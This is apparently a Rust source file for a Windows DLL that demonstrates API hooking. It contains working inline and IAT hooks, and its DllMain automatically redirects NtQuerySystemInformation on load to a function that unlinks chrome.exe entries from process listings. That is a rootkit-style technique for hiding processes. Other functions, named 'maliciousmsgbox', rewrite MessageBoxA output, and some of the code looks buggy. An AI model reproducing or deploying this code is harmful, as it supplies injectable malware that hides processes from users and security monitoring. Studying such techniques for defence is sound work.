// Windows API Hooking
use std::fmt::Write;

use winapi::um::processthreadsapi::{GetCurrentProcess, GetCurrentProcessId, GetCurrentThreadId};
use winapi::um::winnt::{DLL_THREAD_ATTACH, PAGE_EXECUTE_READWRITE, PAGE_READWRITE};
use winapi::um::winuser::*;
use winapi::{ctypes::*, um::winnt::DLL_PROCESS_ATTACH};
use winapi::shared::minwindef::*;
use winapi::um::libloaderapi::*;
use winapi::shared::ntdef::*;
use winapi::shared::windef::*;
use winapi::um::memoryapi::*;
use ntapi::*;
use ntapi::ntexapi::*;
use winapi::shared::ntstatus::*;
use winapi::um::errhandlingapi::*;

use crate::peparser::{getloadeddlls, getprocessbaseaddress};
pub mod peparser;

pub fn ReadStringFromMemory(prochandle: *mut c_void, base: *const c_void) -> String {
    unsafe {
        let mut i: isize = 0;
        let mut s = String::new();
        loop {
            let mut a: [u8; 1] = [0];
            ReadProcessMemory(
                prochandle,
                (base as isize + i) as *const c_void,
                a.as_mut_ptr() as *mut c_void,
                1,
                std::ptr::null_mut(),
            );

            if a[0] == 0 || i == 50 {
                return s;
            }
            s.push(a[0] as char);
            i += 1;
        }
    }
}


#[no_mangle]
pub unsafe extern "C" fn helloworld(){
    unsafe{

       MessageBoxA(std::ptr::null_mut(),
       "hi\0".as_bytes().as_ptr() as *const i8,
       "hi\0".as_bytes().as_ptr() as *const i8, 0);

    }
}



static mut ogbytes:[u8;5] = [0;5];
static mut msgboxaddr: usize = 0;
static mut maliciousmsgboxaddr: usize = 0;
static mut firstthunk: usize = 0;
static mut test1:[u8;8] = [0;8];

#[no_mangle]
pub unsafe extern "C" fn maliciousmsgbox(
    hWnd: HWND,
        lpText: LPCSTR,
        lpCaption: LPCSTR,
        uType: UINT,
   
)->i32{
    unsafe{

        // restored the 5 bytes
        let mut byteswritten = 0;
        WriteProcessMemory(GetCurrentProcess(),
        msgboxaddr as *mut c_void,
        ogbytes.as_ptr() as *const c_void,
        ogbytes.len(),
        &mut byteswritten);


        println!("lptext: {}",ReadStringFromMemory(GetCurrentProcess(), lpText as *const c_void));



        return MessageBoxA(hWnd, "malicious\0".as_bytes().as_ptr() as *const i8, lpCaption, uType);
    }
}



#[no_mangle]
pub unsafe extern "C" fn maliciousmsgbox2(
    hWnd: HWND,
        lpText: LPCSTR,
        lpCaption: LPCSTR,
        uType: UINT,
   
)->i32{
    unsafe{

        // restored the 5 bytes
        let mut byteswritten = 0;
        WriteProcessMemory(GetCurrentProcess(),
        firstthunk as *mut c_void,
        (msgboxaddr.to_ne_bytes().as_ptr()) as *const c_void,
        8,
        &mut byteswritten);


        println!("lptext: {}",ReadStringFromMemory(GetCurrentProcess(), lpText as *const c_void));



        return MessageBoxA(hWnd, "malicious2\0".as_bytes().as_ptr() as *const i8, lpCaption, uType);
    }
}





#[no_mangle]
pub unsafe extern "C" fn myquerysysinfo(
    SystemInformationClass: SYSTEM_INFORMATION_CLASS,
        SystemInformationBuffer: PVOID,
        SystemInformationLength: u32,
        ReturnLength: *mut u32
) -> NTSTATUS{
    unsafe{


        let myquery = std::mem::transmute::<usize,
        fn( SYSTEM_INFORMATION_CLASS,
            PVOID,
             u32,
             *mut u32) -> NTSTATUS
        >(msgboxaddr );



        if SystemInformationClass!=5{
            return myquery(SystemInformationClass, SystemInformationBuffer, SystemInformationLength, ReturnLength);
        }
       
        let ntstatus = myquery(SystemInformationClass, SystemInformationBuffer, SystemInformationLength, ReturnLength);
        if ntstatus!=STATUS_SUCCESS{
            return ntstatus;
        }

        let mut firstinfo = SystemInformationBuffer as usize;

        loop{
            let procinfo = RemoteParse::<SYSTEM_PROCESS_INFORMATION>(GetCurrentProcess(), firstinfo as *const c_void).unwrap();
               

            let procname = unicodetostring(&procinfo.ImageName, GetCurrentProcess()).trim_end_matches("\0").to_string();
            println!("process name: {}",procname);

            if procinfo.NextEntryOffset == 0{
                break;
            }


            let mut offset = procinfo.NextEntryOffset as usize;
            'innerloop: loop{
                let nextprocinfo = RemoteParse::<SYSTEM_PROCESS_INFORMATION>(GetCurrentProcess(), (firstinfo + offset) as *const c_void).unwrap();
               
                let nextprocname = unicodetostring(&nextprocinfo.ImageName, GetCurrentProcess()).trim_end_matches("\0").to_string();
                if nextprocname.to_lowercase() !="chrome.exe"{
                    break 'innerloop;
                }

                if nextprocinfo.NextEntryOffset == 0{
                    let mut oldprotect = 0;
                    VirtualProtect(firstinfo as *mut c_void,
                        4, 0x40, &mut oldprotect);
   
                    let mut byteswritten = 0;
                    let offset2 = 0 as usize;
                    WriteProcessMemory(GetCurrentProcess(),
                    firstinfo as *mut c_void,
                    offset2.to_ne_bytes().as_ptr() as *const c_void,
                    4,&mut byteswritten);
                }


                offset += nextprocinfo.NextEntryOffset as usize;

   
            }

            if offset != procinfo.NextEntryOffset as usize{

                let mut oldprotect = 0;
                VirtualProtect(firstinfo as *mut c_void,
                    4, 0x40, &mut oldprotect);

                let mut byteswritten = 0;
                WriteProcessMemory(GetCurrentProcess(),
                firstinfo as *mut c_void,
                offset.to_ne_bytes().as_ptr() as *const c_void,
                4,&mut byteswritten);
   
            }
           

            firstinfo += offset;

        }



        return ntstatus;
    }
}


#[no_mangle]
pub fn hook(){
    unsafe{

        let procbase = getprocessbaseaddress(GetCurrentProcess());
        let pe = peparser::peparser::parsefrommemory(GetCurrentProcess(), procbase as *const c_void).unwrap();
        let imports = pe.getimports().unwrap();

        //println!("imports: {:x?}",imports);
       
        for i in 0..imports.len(){
            for (k,v) in &imports[i]{
                if &*k.to_lowercase() =="user32.dll"{
                   
                    for (k1,v1) in v{
                       
                        if &*k1.to_lowercase() == "messageboxa"{
                            msgboxaddr = v1[1];
                            println!("msgboxaddr: {:x?}",msgboxaddr);
                        }
                    }
                }
            }
        }



        let loadeddlls = getloadeddlls(GetCurrentProcessId());
        for (k,v) in &loadeddlls{
            if &*k.to_lowercase() == "myhooking.dll"{
                let dllbase = *v;
                let dll = peparser::peparser::parsefrommemory(GetCurrentProcess(), dllbase as *const c_void).unwrap();
                let exports = dll.getexports().unwrap();
                for (k1,v1) in &exports{
                    if &*k1.to_lowercase() == "maliciousmsgbox"{
                        maliciousmsgboxaddr = dllbase + *v1;
                    }
                }


            }
        }


        let mut bytesread = 0;
        ReadProcessMemory(GetCurrentProcess(),
        msgboxaddr as *const c_void,
        ogbytes.as_mut_ptr() as *mut c_void,
        5, &mut bytesread);


        let mut jmp =vec![0u8;5];
        jmp[0] = 0xe9;
        let offset = maliciousmsgboxaddr - (msgboxaddr+5);
        std::ptr::write((jmp.as_mut_ptr() as usize + 1) as *mut u32, offset as u32);


        let mut oldprotect = 0;
        VirtualProtect(msgboxaddr as *mut c_void,
        5, PAGE_EXECUTE_READWRITE, &mut oldprotect);


        WriteProcessMemory(GetCurrentProcess(),
        msgboxaddr as *mut c_void,
        jmp.as_ptr() as *const c_void,
        5, &mut bytesread);


    }
}



#[no_mangle]
pub  fn iathook(srcdll:&str, srcfunc:&str,dstdll:&str,dstfunc:&str){
    unsafe{
       
        let mut iataddr = 0 as usize;
        let procbase = getprocessbaseaddress(GetCurrentProcess());
        //println!("procbase: {:x?}",procbase);
        //let loadeddlls = getloadeddlls(GetCurrentProcessId());
        //println!("loaded dlls: {:x?}",loadeddlls);
        let pe = peparser::peparser::parsefrommemory(GetCurrentProcess(), procbase as *const c_void).unwrap();
        let imports = pe.getimports().unwrap();
        //println!("imports: {:x?}",imports);
        for i in 0..imports.len(){
            for (k,v) in &imports[i]{
                if &*k.to_lowercase() == srcdll{
                   
                    for (k1,v1) in v{
                        if &*k1.to_lowercase() == srcfunc{
                            //println!("{}: {:x?}",k1,v1);
                            msgboxaddr = v1[1];
                            iataddr = v1[0];
                            //println!("firstthunk: {:x?}",iataddr);
                            //println!("msgboxaddr: {:x?}",msgboxaddr);
                        }
                    }
                }
            }
        }

        //println!("firstthunk : {:x?}",iataddr);
        firstthunk = procbase + iataddr;
        let mut maladdr = 0;
        let mut dllbase = 0;
       let dlls = getloadeddlls(GetCurrentProcessId());
        for (k,v ) in &dlls{
            if &*k.to_lowercase() == dstdll{
                 dllbase = *v;
                let dll = peparser::peparser::parsefrommemory(GetCurrentProcess(), dllbase as *const c_void).unwrap();
                let exports = dll.getexports().unwrap();
                for (k2,v2) in &exports{
                    if &*k2.to_lowercase() ==dstfunc{
                       
                        maladdr = dllbase + *v2;
                        maliciousmsgboxaddr = maladdr;
                       // println!("msgboxaddr: {:x?}",msgboxaddr);
                       // println!("maliciousmsgbox: {:x?}",maladdr);
                    }
                }
            }
        }

     
        let mut byteswritten: usize = 0;
        //println!("ntquerysysinfo iataddr: {:x}",(procbase + iataddr) as usize);

        ReadProcessMemory(GetCurrentProcess(),
        (procbase + iataddr) as *mut c_void,
        test1.as_mut_ptr() as *mut c_void ,
        8, &mut byteswritten);

        println!("test1: {:x?}",test1);
       
        //let dllhandle = GetModuleHandleA("user32.dll\0".as_bytes().as_ptr() as *const i8);
        //msgboxaddr = GetProcAddress(dllhandle, "MessageBoxA\0".as_bytes().as_ptr() as *const i8) as usize;

        let mut oldprotect = 0;
        let res = VirtualProtect(
        (procbase + iataddr) as *mut c_void,
         8,
         PAGE_READWRITE,
        &mut oldprotect);
       
       
       
        let res = WriteProcessMemory(GetCurrentProcess(),
        (procbase + iataddr) as *mut c_void,
        maladdr.to_ne_bytes().as_ptr() as *const c_void,
        8,
        &mut byteswritten);
       
       

       
       
    }
}






#[no_mangle]
pub unsafe extern "stdcall" fn DllMain(
    hinstance: HINSTANCE,
    reason: u32,
    reserved: *mut c_void
) -> bool{

    match reason{
        DLL_PROCESS_ATTACH=>{
           // all names should be lowercase
            iathook("ntdll.dll","ntquerysysteminformation",
            "myhooking.dll","myquerysysinfo");
       
        }
        _ => ()
    };
   

    return true;
}






pub fn RemoteParse<T>(prochandle:*mut c_void, baseaddress:*const c_void)
-> Result<T, String> where T:Copy,{

   
    unsafe{
        let mut t1 = std::mem::zeroed::<T>();
        let ssize = std::mem::size_of::<T>();
        let mut buffer = vec![0u8;ssize];
        let mut bytesread = 0;
        let res = ReadProcessMemory(prochandle, baseaddress,
             buffer.as_mut_ptr() as *mut c_void,
             buffer.len(),
            &mut bytesread);
        if res==0{
            return Err(format!("readprocessmemory failed: {}",GetLastError()));
        }
        return Ok(*(buffer.as_mut_ptr() as *mut T));
    }
}






pub fn unicodetostring(lus: &UNICODE_STRING,prochandle: *mut c_void)
  -> String{
    unsafe{

        let mut buffer:Vec<u16> = vec![0;lus.MaximumLength as usize];
        let mut bytesread = 0;
        //std::ptr::copy(lus.Buffer, buffer.as_mut_ptr() as *mut u16,
         //   (lus.Length/2) as usize);
       
        let res = ReadProcessMemory(prochandle,
            lus.Buffer as *const c_void,
            buffer.as_mut_ptr() as *mut c_void,
            (lus.Length) as usize,
            &mut bytesread);

        if bytesread==0{
            return format!("reading process memory failed: {}",GetLastError());
        }

        return String::from_utf16_lossy(&buffer);



    }
  }


